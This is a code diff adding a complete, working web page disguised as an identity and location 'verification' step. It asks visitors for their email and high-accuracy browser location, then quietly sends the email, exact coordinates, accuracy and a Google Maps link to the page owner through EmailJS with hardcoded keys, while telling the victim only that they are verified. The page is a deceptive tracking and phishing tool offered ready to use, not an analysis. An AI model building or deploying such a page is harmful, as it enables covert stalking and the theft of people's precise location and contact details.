@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verify Your Location</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&family=Syne:wght@700;800&display=swap');
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0c0f1a; --surface: #141824; --border: #232840;
+      --accent: #4f7bff; --accent-glow: rgba(79,123,255,0.18);
+      --text: #e8eaf2; --muted: #7a80a0; --success: #22c55e; --error: #f87171;
+    }
+    body {
+      font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text);
+      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px;
+    }
+    .card {
+      background: var(--surface); border: 1px solid var(--border); border-radius: 20px;
+      padding: 48px 40px; width: 100%; max-width: 440px;
+      box-shadow: 0 0 60px rgba(0,0,0,0.5), 0 0 100px var(--accent-glow);
+    }
+    .logo {
+      width: 48px; height: 48px; background: var(--accent); border-radius: 14px;
+      display: flex; align-items: center; justify-content: center; margin-bottom: 28px;
+    }
+    .logo svg { width: 26px; height: 26px; fill: #fff; }
+    h1 { font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800; letter-spacing: -0.5px; margin-bottom: 8px; }
+    .subtitle { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 36px; }
+    .step { display: none; }
+    .step.active { display: block; }
+    label { display: block; font-size: 12px; font-weight: 600; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); margin-bottom: 10px; }
+    input[type="email"] {
+      width: 100%; background: var(--bg); border: 1.5px solid var(--border); border-radius: 10px;
+      color: var(--text); font-family: 'Inter', sans-serif; font-size: 15px; padding: 14px 16px;
+      outline: none; transition: border-color 0.2s; margin-bottom: 6px;
+    }
+    input[type="email"]:focus { border-color: var(--accent); }
+    .field-error { font-size: 12px; color: var(--error); min-height: 18px; margin-bottom: 24px; }
+    .btn {
+      width: 100%; background: var(--accent); color: #fff; border: none; border-radius: 10px;
+      font-family: 'Inter', sans-serif; font-size: 15px; font-weight: 600; padding: 14px;
+      cursor: pointer; transition: opacity 0.2s, transform 0.1s;
+    }
+    .btn:hover { opacity: 0.88; }
+    .btn:active { transform: scale(0.98); }
+    .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+    .btn-secondary {
+      background: transparent; border: 1.5px solid var(--border); color: var(--muted); margin-top: 12px;
+    }
+    .location-icon {
+      width: 72px; height: 72px; background: var(--accent-glow); border: 1.5px solid var(--accent);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px;
+    }
+    .location-icon svg { width: 34px; height: 34px; fill: var(--accent); }
+    .centered { text-align: center; }
+    .spinner {
+      width: 40px; height: 40px; border: 3px solid var(--border); border-top-color: var(--accent);
+      border-radius: 50%; animation: spin 0.8s linear infinite; margin: 16px auto;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .status-msg { font-size: 13px; color: var(--muted); text-align: center; margin-top: 12px; }
+    .error-msg {
+      font-size: 13px; color: var(--error); background: rgba(248,113,113,0.08);
+      border: 1px solid rgba(248,113,113,0.2); border-radius: 8px;
+      padding: 12px 14px; margin-top: 16px; line-height: 1.5;
+    }
+    /* Success step */
+    .success-icon {
+      width: 80px; height: 80px; background: rgba(34,197,94,0.1); border: 2px solid rgba(34,197,94,0.35);
+      border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px;
+      animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+    }
+    @keyframes popIn { from { transform: scale(0.5); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+    .success-icon svg { width: 38px; height: 38px; stroke: var(--success); fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+    .success-title { font-family: 'Syne', sans-serif; font-size: 26px; font-weight: 800; margin-bottom: 10px; }
+    .success-sub { font-size: 14px; color: var(--muted); line-height: 1.6; margin-bottom: 32px; }
+    .map-link {
+      display: flex; align-items: center; gap: 8px; background: var(--accent-glow);
+      border: 1.5px solid var(--accent); border-radius: 10px; color: var(--accent);
+      font-size: 14px; font-weight: 600; padding: 14px 18px; text-decoration: none;
+      transition: background 0.2s; margin-bottom: 0;
+    }
+    .map-link:hover { background: rgba(79,123,255,0.28); }
+    .map-link svg { width: 18px; height: 18px; fill: var(--accent); flex-shrink: 0; }
+  </style>
+</head>
+<body>
+<div class="card">
+
+  <!-- STEP 1: Email -->
+  <div class="step active" id="step-email">
+    <div class="logo">
+      <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5S10.62 6.5 12 6.5s2.5 1.12 2.5 2.5S13.38 11.5 12 11.5z"/></svg>
+    </div>
+    <h1>Confirm your identity</h1>
+    <p class="subtitle">Enter your email address to proceed. We'll then verify your location.</p>
+    <label for="email-input">Email address</label>
+    <input type="email" id="email-input" placeholder="you@example.com" autocomplete="email" />
+    <div class="field-error" id="email-error"></div>
+    <button class="btn" onclick="handleProceed()">Proceed →</button>
+  </div>
+
+  <!-- STEP 2: Allow Location -->
+  <div class="step" id="step-location">
+    <div class="centered">
+      <div class="location-icon">
+        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5S10.62 6.5 12 6.5s2.5 1.12 2.5 2.5S13.38 11.5 12 11.5z"/></svg>
+      </div>
+      <h1>Allow location access</h1>
+      <p class="subtitle" style="margin-bottom:32px;">We need your device location to complete verification. Click below and allow access when your browser asks.</p>
+      <button class="btn" id="location-btn" onclick="requestLocation()">Allow location access</button>
+      <button class="btn btn-secondary" onclick="goBack()">← Go back</button>
+      <div id="location-status"></div>
+    </div>
+  </div>
+
+  <!-- STEP 3: Success -->
+  <div class="step" id="step-success">
+    <div class="centered">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"></polyline></svg>
+      </div>
+      <div class="success-title">All done!</div>
+      <p class="success-sub">Your location has been verified and the details have been sent successfully.</p>
+      <a id="map-link" href="#" target="_blank" rel="noopener noreferrer" class="map-link">
+        <svg viewBox="0 0 24 24"><path d="M20.5 3l-.16.03L15 5.1 9 3 3.36 4.9c-.21.07-.36.25-.36.48V20.5c0 .28.22.5.5.5l.16-.03L9 18.9l6 2.1 5.64-1.9c.21-.07.36-.25.36-.48V3.5c0-.28-.22-.5-.5-.5zM15 19l-6-2.11V5l6 2.11V19z"/></svg>
+        View your location on Google Maps
+      </a>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ─── EMAILJS CONFIG — fill these in after setup ───
+  const EMAILJS_PUBLIC_KEY  = "9tIBoREC4jgNsCV6a";
+  const EMAILJS_SERVICE_ID  = "service_1rplfg5";
+  const EMAILJS_TEMPLATE_ID = "template_wv7negf";
+  // ──────────────────────────────────────────────────
+
+  emailjs.init(EMAILJS_PUBLIC_KEY);
+
+  let capturedEmail = '';
+
+  function showStep(id) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+  }
+
+  function handleProceed() {
+    const input = document.getElementById('email-input');
+    const errEl = document.getElementById('email-error');
+    const email = input.value.trim();
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      errEl.textContent = 'Please enter a valid email address.';
+      input.focus();
+      return;
+    }
+    errEl.textContent = '';
+    capturedEmail = email;
+    showStep('step-location');
+  }
+
+  function goBack() {
+    showStep('step-email');
+    document.getElementById('location-status').innerHTML = '';
+    document.getElementById('location-btn').disabled = false;
+  }
+
+  function requestLocation() {
+    const btn = document.getElementById('location-btn');
+    const statusEl = document.getElementById('location-status');
+
+    if (!navigator.geolocation) {
+      statusEl.innerHTML = '<div class="error-msg">Geolocation is not supported by your browser.</div>';
+      return;
+    }
+
+    btn.disabled = true;
+    statusEl.innerHTML = '<div class="spinner"></div><p class="status-msg">Waiting for location permission…</p>';
+
+    navigator.geolocation.getCurrentPosition(
+      (pos) => {
+        const lat = pos.coords.latitude;
+        const lng = pos.coords.longitude;
+        const acc = Math.round(pos.coords.accuracy);
+        const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+        const timestamp = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+
+        statusEl.innerHTML = '<div class="spinner"></div><p class="status-msg">Sending data to email…</p>';
+
+        emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+          user_email:   capturedEmail,
+          latitude:     lat.toFixed(6),
+          longitude:    lng.toFixed(6),
+          accuracy:     acc + ' meters',
+          maps_link:    mapsUrl,
+          captured_at:  timestamp,
+        })
+        .then(() => {
+          document.getElementById('map-link').href = mapsUrl;
+          showStep('step-success');
+        })
+        .catch((err) => {
+          btn.disabled = false;
+          statusEl.innerHTML = `<div class="error-msg">Failed to send data. EmailJS error: ${JSON.stringify(err)}<br>Check your EmailJS keys.</div>`;
+        });
+      },
+      (err) => {
+        btn.disabled = false;
+        let msg = 'Unable to get location. ';
+        if (err.code === 1) msg += 'You denied location access. Please allow it and try again.';
+        else if (err.code === 2) msg += 'Location information is unavailable.';
+        else if (err.code === 3) msg += 'The request timed out. Please try again.';
+        statusEl.innerHTML = `<div class="error-msg">${msg}</div>`;
+      },
+      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+    );
+  }
+
+  document.getElementById('email-input').addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') handleProceed();
+  });
+</script>
+</body>
+</html>
